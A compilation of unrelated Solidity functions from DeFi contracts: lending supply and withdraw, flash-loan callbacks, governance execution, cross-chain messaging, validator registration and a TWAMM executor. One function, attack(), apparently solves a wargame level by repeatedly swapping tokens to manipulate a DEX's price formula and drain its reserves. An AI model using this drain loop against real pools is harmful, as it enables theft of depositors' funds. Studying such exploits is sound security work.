function supply(
    MarketParams memory marketParams,
    uint256 assets,
    uint256 shares,
    address onBehalf,
    bytes calldata data
) external returns (uint256, uint256) {
    Id id = marketParams.id();
    require(market[id].lastUpdate != 0, ErrorsLib.MARKET_NOT_CREATED);
    require(UtilsLib.exactlyOneZero(assets, shares), ErrorsLib.INCONSISTENT_INPUT);
    require(onBehalf != address(0), ErrorsLib.ZERO_ADDRESS);

    _accrueInterest(marketParams, id);

    if (assets > 0) shares = assets.toSharesDown(market[id].totalSupplyAssets, market[id].totalSupplyShares);
    else assets = shares.toAssetsUp(market[id].totalSupplyAssets, market[id].totalSupplyShares);

    position[id][onBehalf].supplyShares += shares;
    market[id].totalSupplyShares += shares.toUint128();
    market[id].totalSupplyAssets += assets.toUint128();

    emit EventsLib.Supply(id, msg.sender, onBehalf, assets, shares);

    if (data.length > 0) IMorphoSupplyCallback(msg.sender).onMorphoSupply(assets, data);

    IERC20(marketParams.loanToken).safeTransferFrom(msg.sender, address(this), assets);

    return (assets, shares);
}

function receiveFlashLoan(
    address[] memory _tokens,
    uint256[] memory _amounts,
    uint256[] memory _feeAmounts,
    bytes memory _userData
) external nonReentrant {
    if (msg.sender != VAULT_ADDR) {
        revert UntrustedLender();
    }
    (Recipe memory currRecipe, address wallet) = abi.decode(_userData, (Recipe, address));

    uint256[] memory balancesBefore = new uint256[](_tokens.length);
    for (uint256 i = 0; i < _tokens.length; i++) {
        _tokens[i].withdrawTokens(wallet, _amounts[i]);
        balancesBefore[i] = _tokens[i].getBalance(address(this));
    }

    _executeRecipe(wallet, _getWalletType(wallet), currRecipe, _amounts[0] + _feeAmounts[0]);

    for (uint256 i = 0; i < _tokens.length; i++) {
        uint256 paybackAmount = _amounts[i] + (_feeAmounts[i]);

        if (_tokens[i].getBalance(address(this)) != paybackAmount + balancesBefore[i]) {
            revert WrongPaybackAmountError();
        }

        _tokens[i].withdrawTokens(address(VAULT_ADDR), paybackAmount);
    }
}

function parseBlockHeader(
    bytes calldata blockHeaderRaw_,
    bool returnInBEFormat_
) internal pure returns (HeaderData memory headerData_, bytes32 blockHash_) {
    if (blockHeaderRaw_.length != BLOCK_HEADER_DATA_LENGTH)
        revert InvalidBlockHeaderDataLength();

    headerData_ = HeaderData({
        version: uint32(bytes4(blockHeaderRaw_[0:4])),
        prevBlockHash: bytes32(blockHeaderRaw_[4:36]),
        merkleRoot: bytes32(blockHeaderRaw_[36:68]),
        time: uint32(bytes4(blockHeaderRaw_[68:72])),
        bits: bytes4(blockHeaderRaw_[72:76]),
        nonce: uint32(bytes4(blockHeaderRaw_[76:80]))
    });

    blockHash_ = _getBlockHeaderHash(blockHeaderRaw_);

    if (returnInBEFormat_) {
        headerData_.version = headerData_.version.uint32LEtoBE();
        headerData_.prevBlockHash = headerData_.prevBlockHash.bytes32LEtoBE();
        headerData_.merkleRoot = headerData_.merkleRoot.bytes32LEtoBE();
        headerData_.time = headerData_.time.uint32LEtoBE();
        headerData_.bits = bytes4(uint32(headerData_.bits).uint32LEtoBE());
        headerData_.nonce = headerData_.nonce.uint32LEtoBE();

        blockHash_ = blockHash_.bytes32LEtoBE();
    }
}

function execute(
    address[] memory targets,
    uint256[] memory values,
    bytes[] memory calldatas,
    bytes32 descriptionHash
) public payable virtual returns (uint256) {
    uint256 proposalId = getProposalId(targets, values, calldatas, descriptionHash);
    bool needsQueueing = proposalNeedsQueuing(proposalId);

    _validateStateBitmap(
        proposalId,
        _encodeStateBitmap(needsQueueing ? ProposalState.Queued : ProposalState.Succeeded)
    );

    // mark as executed before calls to avoid reentrancy
    _proposals[proposalId].executed = true;

    // before execute: register governance call in queue.
    if (_executor() != address(this)) {
        for (uint256 i = 0; i < targets.length; ++i) {
            if (targets[i] == address(this)) {
                _governanceCall.pushBack(keccak256(calldatas[i]));
            }
        }
    }

    _executeOperations(proposalId, targets, values, calldatas, descriptionHash);

    // after execute: cleanup governance call queue.
    if (_executor() != address(this) && !_governanceCall.empty()) {
        _governanceCall.clear();
    }

    emit ProposalExecuted(proposalId);

    return proposalId;
}

function getTokenBalances(address token, address[] memory addresses)
        internal
        virtual
        returns (uint256[] memory balances)
    {
        uint256 tokenCodeSize;
        assembly {
            tokenCodeSize := extcodesize(token)
        }
        require(tokenCodeSize > 0, "StdUtils getTokenBalances(address,address[]): Token address is not a contract.");

        // ABI encode the aggregate call to Multicall3.
        uint256 length = addresses.length;
        IMulticall3.Call[] memory calls = new IMulticall3.Call[](length);
        for (uint256 i = 0; i < length; ++i) {
            // 0x70a08231 = bytes4(keccak256("balanceOf(address)"))
            calls[i] = IMulticall3.Call({target: token, callData: abi.encodeWithSelector(0x70a08231, (addresses[i]))});
        }

        // Make the aggregate call.
        (, bytes[] memory returnData) = StdConstants.MULTICALL3_ADDRESS.aggregate(calls);

        // ABI decode the return data and return the balances.
        balances = new uint256[](length);
        for (uint256 i = 0; i < length; ++i) {
            balances[i] = abi.decode(returnData[i], (uint256));
        }
    }

function _withdraw(
  address owner,
  address recipient,
  uint256 staticAmount,
  uint256 dynamicAmount,
  bool toUnderlying
) internal returns (uint256, uint256) {
  require(recipient != address(0), 'INVALID_RECIPIENT');
  require(staticAmount == 0 || dynamicAmount == 0, 'ONLY_ONE_AMOUNT_FORMAT_ALLOWED');

  uint256 userBalance = balanceOf(owner);

  uint256 amountToWithdraw;
  uint256 amountToBurn;

  uint256 currentRate = rate();
  if (staticAmount > 0) {
    amountToBurn = (staticAmount > userBalance) ? userBalance : staticAmount;
    amountToWithdraw = (staticAmount > userBalance)
      ? _staticToDynamicAmount(userBalance, currentRate)
      : _staticToDynamicAmount(staticAmount, currentRate);
  } else {
    uint256 dynamicUserBalance = _staticToDynamicAmount(userBalance, currentRate);
    amountToWithdraw = (dynamicAmount > dynamicUserBalance) ? dynamicUserBalance : dynamicAmount;
    amountToBurn = _dynamicToStaticAmount(amountToWithdraw, currentRate);
  }

  _burn(owner, amountToBurn);

  if (toUnderlying) {
    LENDING_POOL.withdraw(address(ASSET), amountToWithdraw, recipient);
  } else {
    ATOKEN.safeTransfer(recipient, amountToWithdraw);
  }

  return (amountToBurn, amountToWithdraw);
}

function harvest(
  address alchemist,
  address yieldToken
) external override {
  if (msg.sender != gelatoPoker) {
    revert Unauthorized();
  }

  if (tx.gasprice > maxGasPrice) {
    revert TheGasIsTooDamnHigh();
  }

  HarvestResolver.HarvestJob memory h = IHarvestResolver(resolver).harvestJobs(yieldToken);

  IAlchemistV2.YieldTokenParams memory ytp = IAlchemistV2(h.alchemist).getYieldTokenParameters(yieldToken);

  uint256 pps = ITokenAdapter(ytp.adapter).price();
  uint256 currentValue = ((ytp.activeBalance + ytp.harvestableBalance) * pps) / 10**ytp.decimals;

  uint256 minimumAmountOut = currentValue - ytp.expectedValue;
  minimumAmountOut = minimumAmountOut - (minimumAmountOut * h.slippageBps) / SLIPPAGE_PRECISION;

  IAlchemistV2(alchemist).harvest(yieldToken, minimumAmountOut);

  (address rewardCollector, , , ,) = IRewardRouter(rewardRouter).getRewardCollector(yieldToken);

  if (rewardCollector != address(0)) {
    IRewardRouter(rewardRouter).distributeRewards(yieldToken);
  }

  IHarvestResolver(resolver).recordHarvest(yieldToken);
}

function attack() external {
    address[2] memory tokens = [dex.token1(), dex.token2()];

    // approve the contract for all tokens
    SwappableToken(tokens[0]).approve(address(dex), type(uint256).max);
    SwappableToken(tokens[1]).approve(address(dex), type(uint256).max);

    uint[2] memory hackBalances;
    uint[2] memory dexBalances;
    uint fromIndex = 0;
    uint toIndex = 1;
    while(true){
        hackBalances = [ SwappableToken(tokens[fromIndex]).balanceOf(address(this)),
                         SwappableToken(tokens[  toIndex]).balanceOf(address(this))];

        dexBalances = [SwappableToken(tokens[fromIndex]).balanceOf(address(dex)),
                       SwappableToken(tokens[  toIndex]).balanceOf(address(dex))];

        uint swapPrice = dex.get_swap_price(tokens[fromIndex], tokens[toIndex], hackBalances[0]);
        if(swapPrice > dexBalances[1]) {
            dex.swap(tokens[fromIndex], tokens[toIndex], dexBalances[0]);
            break;
        }else {
            dex.swap(tokens[fromIndex], tokens[toIndex], hackBalances[0]);
        }
        // reverse indexes
        fromIndex = 1 - fromIndex;
        toIndex = 1 - toIndex;
    }
}

function compare(
    bytes memory vA,
    uint256 offA,
    uint256 lenA,
    bytes memory vB,
    uint256 offB,
    uint256 lenB
) internal pure returns (int256) {
    _checkBound(vA, offA + lenA);
    _checkBound(vB, offB + lenB);
    unchecked {
        uint256 ptrA = LibMem.ptr(vA) + offA;
        uint256 ptrB = LibMem.ptr(vB) + offB;
        uint256 shortest = lenA < lenB ? lenA : lenB;
        for (uint256 i; i < shortest; i += 32) {
            uint256 a = LibMem.load(ptrA + i);
            uint256 b = LibMem.load(ptrB + i);
            if (a != b) {
                uint256 rest = shortest - i;
                if (rest < 32) {
                    rest = (32 - rest) << 3; // bits to drop
                    a >>= rest; // shift out the
                    b >>= rest; // irrelevant bits
                }
                if (a < b) {
                    return -1;
                } else if (a > b) {
                    return 1;
                }
            }
        }
    }
    return int256(lenA) - int256(lenB);
}

function sendMessage(
    bytes calldata recipient,
    bytes calldata payload,
    bytes[] calldata attributes
) public payable virtual returns (bytes32 sendId) {
    // attributes are not supported
    if (attributes.length > 0) {
        revert UnsupportedAttribute(bytes4(attributes[0]));
    }

    // parse recipient
    (bool success, uint256 chainid, address target) = recipient.tryParseEvmV1Calldata();
    require(success && chainid == block.chainid, InvalidDestination());

    // perform call
    bytes4 magic = IERC7786Recipient(target).receiveMessage{value: msg.value}(
        bytes32(++_lastReceiveId),
        InteroperableAddress.formatEvmV1(block.chainid, msg.sender),
        payload
    );
    require(magic == IERC7786Recipient.receiveMessage.selector, ReceiverError());

    // emit standard event
    emit MessageSent(
        bytes32(0),
        InteroperableAddress.formatEvmV1(block.chainid, msg.sender),
        recipient,
        payload,
        msg.value,
        attributes
    );

    return 0;
}

function mint(
    uint64 destinationChainSelector,
    address receiver,
    PayFeesIn payFeesIn
) external {
    Client.EVM2AnyMessage memory message = Client.EVM2AnyMessage({
        receiver: abi.encode(receiver),
        data: abi.encodeWithSignature("mint(address)", msg.sender),
        tokenAmounts: new Client.EVMTokenAmount[](0),
        extraArgs: "",
        feeToken: payFeesIn == PayFeesIn.LINK ? i_link : address(0)
    });

    uint256 fee = IRouterClient(i_router).getFee(
        destinationChainSelector,
        message
    );

    bytes32 messageId;

    if (payFeesIn == PayFeesIn.LINK) {
        LinkTokenInterface(i_link).approve(i_router, fee);
        messageId = IRouterClient(i_router).ccipSend(
            destinationChainSelector,
            message
        );
    } else {
        messageId = IRouterClient(i_router).ccipSend{value: fee}(
            destinationChainSelector,
            message
        );
    }

    emit MessageSent(messageId);
}

function payNops() public {
  if (msg.sender != owner()) {
    if (msg.sender != s_admin) {
      if (!s_nops.contains(msg.sender)) {
        revert OnlyCallableByOwnerOrAdminOrNop();
      }
    }
  }
  uint256 weightsTotal = s_nopWeightsTotal;
  if (weightsTotal == 0) revert NoNopsToPay();

  uint96 totalFeesToPay = s_nopFeesJuels;
  if (totalFeesToPay < weightsTotal) revert NoFeesToPay();
  if (linkAvailableForPayment() < 0) revert InsufficientBalance();

  uint96 fundsLeft = totalFeesToPay;
  uint256 numberOfNops = s_nops.length();
  for (uint256 i = 0; i < numberOfNops; ++i) {
    (address nop, uint256 weight) = s_nops.at(i);
    // amount can never be higher than totalFeesToPay so the cast to uint96 is safe
    uint96 amount = uint96((totalFeesToPay * weight) / weightsTotal);
    fundsLeft -= amount;
    IERC20(i_linkToken).safeTransfer(nop, amount);
    emit NopPaid(nop, amount);
  }
  // Some funds can remain, since this is an incredibly small
  // amount we consider this OK.
  s_nopFeesJuels = fundsLeft;
}

function registerValidators(
    ValidatorData[] calldata newValidators
) public onlyRole(VALIDATOR_MANAGER_ROLE) nonReentrant {

    if (validatorRegistrationPaused) {
        revert ValidatorRegistrationPaused();
    }

    if (newValidators.length == 0) {
        revert NoValidatorsProvided();
    }

    validateNodes(newValidators);

    uint256 totalDepositAmount = newValidators.length * DEFAULT_VALIDATOR_STAKE;
    ynETH.withdrawETH(totalDepositAmount); // Withdraw ETH from depositPool

    uint256 newValidatorCount = newValidators.length;
    for (uint256 i = 0; i < newValidatorCount; i++) {

        ValidatorData calldata validator = newValidators[i];
        if (usedValidators[validator.publicKey]) {
            revert ValidatorAlreadyUsed(validator.publicKey);
        }
        usedValidators[validator.publicKey] = true;

        _registerValidator(validator, DEFAULT_VALIDATOR_STAKE);
    }

    // After registering validators, update the total ETH staked
    updateTotalETHStaked();
}

function confirmBlock(StoredBlockInfo memory _block) external onlyValidator payable {
    require(isBlockConfirmable(_block), "n0");

    // send confirm message to slaver chains
    uint32 blockNumber = _block.blockNumber;
    uint256 leftMsgValue = msg.value;
    for (uint8 chainId = MIN_CHAIN_ID; chainId <= MAX_CHAIN_ID; ++chainId) {
        uint256 chainIndex = 1 << chainId - 1;
        if (chainIndex & ALL_CHAINS == chainIndex) {
            if (chainId == MASTER_CHAIN_ID) {
                continue;
            }
            ISyncService syncService = chainSyncServiceMap[chainId];
            uint nativeFee = syncService.estimateConfirmBlockFee(chainId, blockNumber);
            require(leftMsgValue >= nativeFee, "n1");
            syncService.confirmBlock{value:nativeFee}(chainId, blockNumber);
            leftMsgValue -= nativeFee;
        }
    }
    if (leftMsgValue > 0) {
        // solhint-disable-next-line avoid-low-level-calls
        (bool success, ) = msg.sender.call{value: leftMsgValue}("");
        require(success, "n2");
    }

    totalBlocksSynchronized = blockNumber;
    emit BlockSynced(blockNumber);
}

function checker() external view returns (bool canExec, bytes memory execPayload) {
  if (paused) {
    return (false, abi.encode(0));
  }

  for (uint256 i = 0; i < yieldTokens.length; i++) {
    address yieldToken = yieldTokens[i];
    HarvestJob memory h = harvestJobs[yieldToken];
    if (h.active) {
      IAlchemistV2.YieldTokenParams memory ytp = IAlchemistV2(h.alchemist).getYieldTokenParameters(yieldToken);

      if (ytp.enabled) {
        uint256 pps = ITokenAdapter(ytp.adapter).price();
        uint256 currentValue = ((ytp.activeBalance + ytp.harvestableBalance) * pps) / 10**ytp.decimals;
        if (
          (block.timestamp >= h.lastHarvest + h.minimumDelay) &&
          (currentValue > ytp.expectedValue + h.minimumHarvestAmount)
        ) {
          uint256 minimumAmountOut = currentValue - ytp.expectedValue;
          minimumAmountOut = minimumAmountOut - (minimumAmountOut * h.slippageBps) / SLIPPAGE_PRECISION;

          return (
            true,
            abi.encodeWithSelector(IAlchemixHarvester.harvest.selector, h.alchemist, yieldToken)
          );
        }
      }
    }
  }
  return (false, abi.encode(0));
}

function onFlashLoan(
    address _initiator,
    address _token,
    uint256 _amount,
    uint256 _fee,
    bytes calldata _data
) external nonReentrant returns (bytes32) {
    if (
        msg.sender != DSS_FLASH_ADDR && msg.sender != GHO_FLASH_MINTER_ADDR
            && msg.sender != CURVEUSD_FLASH_ADDR
    ) {
        revert UntrustedLender();
    }
    if (_initiator != address(this)) {
        revert UntrustedInitiator();
    }

    (Recipe memory currRecipe, address wallet) = abi.decode(_data, (Recipe, address));
    _token.withdrawTokens(wallet, _amount);
    uint256 balanceBefore = _token.getBalance(address(this));

    uint256 paybackAmount = _amount + _fee;

    _executeRecipe(wallet, _getWalletType(wallet), currRecipe, paybackAmount);

    if (_token.getBalance(address(this)) != paybackAmount + balanceBefore) {
        revert WrongPaybackAmountError();
    }

    if (msg.sender == CURVEUSD_FLASH_ADDR) {
        _token.withdrawTokens(msg.sender, paybackAmount);
    } else {
        _token.approveToken(msg.sender, paybackAmount);
    }

    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}

function receiveFlashLoan(
    address[] memory _tokens,
    uint256[] memory _amounts,
    uint256[] memory _feeAmounts,
    bytes memory _userData
) external override nonReentrant {
    require(msg.sender == VAULT_ADDR, "Untrusted lender");
    (Recipe memory currRecipe, address wallet) = abi.decode(_userData, (Recipe, address));

    uint256[] memory balancesBefore = new uint256[](_tokens.length);
    for (uint256 i = 0; i < _tokens.length; i++) {
        _tokens[i].withdrawTokens(wallet, _amounts[i]);
        balancesBefore[i] = _tokens[i].getBalance(address(this));
    }

    _executeRecipe(wallet, _getWalletType(wallet), currRecipe, (_amounts[0] + _feeAmounts[0]));

    for (uint256 i = 0; i < _tokens.length; i++) {
        uint256 paybackAmount = _amounts[i] + _feeAmounts[i];

        require(
            _tokens[i].getBalance(address(this)) == paybackAmount + balancesBefore[i],
            "Wrong payback amount"
        );

        _tokens[i].withdrawTokens(address(VAULT_ADDR), paybackAmount);
    }
}

function executeAction(
    bytes memory _callData,
    bytes32[] memory _subData,
    uint8[] memory _paramMapping,
    bytes32[] memory _returnValues
) public payable virtual override returns (bytes32) {
    Params memory params = parseInputs(_callData);

    params.market = _parseParamAddr(params.market, _paramMapping[0], _subData, _returnValues);
    params.tokenAddr =
        _parseParamAddr(params.tokenAddr, _paramMapping[1], _subData, _returnValues);
    params.amount = _parseParamUint(params.amount, _paramMapping[2], _subData, _returnValues);
    params.rateMode =
        _parseParamUint(params.rateMode, _paramMapping[3], _subData, _returnValues);
    params.to = _parseParamAddr(params.to, _paramMapping[4], _subData, _returnValues);
    params.onBehalf =
        _parseParamAddr(params.onBehalf, _paramMapping[5], _subData, _returnValues);

    (uint256 borrowAmount, bytes memory logData) = _borrow(
        params.market,
        params.tokenAddr,
        params.amount,
        params.rateMode,
        params.to,
        params.onBehalf
    );
    emit ActionEvent("AaveBorrow", logData);
    return bytes32(borrowAmount);
}

function _supply(
    address _market,
    uint256 _amount,
    address _from,
    uint16 _assetId,
    address _onBehalf
) internal returns (uint256, bytes memory) {
    IPoolV3 lendingPool = getLendingPool(_market);
    address tokenAddr = lendingPool.getReserveAddressById(_assetId);

    // if amount is set to max, take the whole _from balance
    if (_amount == type(uint256).max) {
        _amount = tokenAddr.getBalance(_from);
    }

    // default to onBehalf of user's wallet
    if (_onBehalf == address(0)) {
        _onBehalf = address(this);
    }

    // pull tokens to user's wallet so we can supply
    tokenAddr.pullTokensIfNeeded(_from, _amount);

    // approve aave pool to pull tokens
    tokenAddr.approveToken(address(lendingPool), _amount);

    lendingPool.supply(tokenAddr, _amount, _onBehalf, AAVE_REFERRAL_CODE);

    bytes memory logData = abi.encode(_market, tokenAddr, _amount, _from, _onBehalf);
    return (_amount, logData);
}

function initialize(
  uint128 adminThreshold,
  uint128 executorThreshold,
  address[] calldata keys,
  uint8[] calldata keyTypes // must all be 3 (Dual) for V1
) external {
  // Ensure that this function is only callable during contract construction.
  assembly { if extcodesize(address) { revert(0, 0) } }

  // V1 only allows setting a singly Dual key with thresholds both set to 1.
  require(keys.length == 1, "Must supply exactly one key in V1.");

  require(keys[0] != address(0), "Cannot supply the null address as a key.");

  require(
    keyTypes.length == 1 && keyTypes[0] == uint8(3),
    "Must supply exactly one Dual keyType (3) in V1."
  );

  require(adminThreshold == 1, "Admin threshold must be exactly one in V1.");

  require(
    executorThreshold == 1, "Executor threshold must be exactly one in V1."
  );

  // Set the key and emit a corresponding event.
  _keys[uint160(keys[0])] = KeyType.Dual;
  emit KeyModified(keys[0], true, true);

  // Note: skip additional key counts + thresholds setup in V1 (only one key).
}

function takeAdminAction(
  AdminActionType adminActionType, uint160 argument, bytes calldata signatures
) external {
  // Only Admin Action Type 6 (AddDualKey) is supported in V1.
  require(
    adminActionType == AdminActionType.AddDualKey,
    "Only adding new Dual key types (admin action type 6) is supported in V1."
  );

  require(argument != uint160(0), "Cannot supply the null address as a key.");

  require(_keys[argument] == KeyType.None, "Key already exists.");

  // Verify signature against a hash of the prefixed admin admin actionID.
  _verifySignature(
    _getAdminActionID(argument, _nonce).toEthSignedMessageHash(), signatures
  );

  // Increment the key count for both standard and admin keys.
  _additionalKeyCounts.standard++;
  _additionalKeyCounts.admin++;

  // Set the key and emit a corresponding event.
  _keys[argument] = KeyType.Dual;
  emit KeyModified(address(argument), true, true);

  // Increment the nonce.
  _nonce++;
}

function hasPermission(
    address who_,
    string memory resource_,
    string memory permission_
) public view virtual override returns (bool isAllowed_) {
    string[] memory roles_ = getUserRoles(who_);

    for (uint256 i = 0; i < roles_.length; ++i) {
        string memory role_ = roles_[i];

        if (_isDisallowed(role_, resource_, permission_)) {
            return false;
        }

        isAllowed_ = isAllowed_ || _isAllowed(role_, resource_, permission_);
    }

    string[] memory groups_ = getUserGroups(who_);

    for (uint256 i = 0; i < groups_.length; ++i) {
        roles_ = getGroupRoles(groups_[i]);

        for (uint256 j = 0; j < roles_.length; ++j) {
            string memory role_ = roles_[j];

            if (_isDisallowed(role_, resource_, permission_)) {
                return false;
            }

            isAllowed_ = isAllowed_ || _isAllowed(role_, resource_, permission_);
        }
    }
}

function setDNSRRSet(
    bytes32 node,
    bytes memory name,
    uint16 resource,
    bytes memory data,
    uint256 offset,
    uint256 size,
    bool deleteRecord,
    uint64 version
) private {
    bytes32 nameHash = keccak256(name);
    bytes memory rrData = data.substring(offset, size);
    if (deleteRecord) {
        if (
            versionable_records[version][node][nameHash][resource].length !=
            0
        ) {
            versionable_nameEntriesCount[version][node][nameHash]--;
        }
        delete (versionable_records[version][node][nameHash][resource]);
        emit DNSRecordDeleted(node, name, resource);
    } else {
        if (
            versionable_records[version][node][nameHash][resource].length ==
            0
        ) {
            versionable_nameEntriesCount[version][node][nameHash]++;
        }
        versionable_records[version][node][nameHash][resource] = rrData;
        emit DNSRecordChanged(node, name, resource, rrData);
    }
}

function executeVirtualOrdersInternal(uint256 blockTimestamp) internal {
    emit Value("executeVirtualOrdersInternal", blockTimestamp);
    if(newSwapsPaused) return; // skip twamm executions
    if(twammUpToDate()) return; // save gas

    LongTermOrdersLib.ExecuteVirtualOrdersResult memory result = LongTermOrdersLib.ExecuteVirtualOrdersResult(
        reserve0,
        reserve1,
        twammReserve0,
        twammReserve1,
        fee
    );

    longTermOrders.executeVirtualOrdersUntilTimestamp(blockTimestamp, result);
    emit Value("twammReserve0", result.newTwammReserve0);

    twammReserve0 = uint112(result.newTwammReserve0);
    twammReserve1 = uint112(result.newTwammReserve1);

    uint112 newReserve0 = uint112(result.newReserve0);
    uint112 newReserve1 = uint112(result.newReserve1);

    uint32 timeElapsed = _getTimeElapsed();
    // update reserve0 and reserve1
    if ( timeElapsed > 0 && (newReserve0 != reserve0 || newReserve1 != reserve1)) {
        _update(newReserve0, newReserve1, reserve0, reserve1, timeElapsed);
    } else {
        reserve0 = newReserve0;
        reserve1 = newReserve1;
    }
}

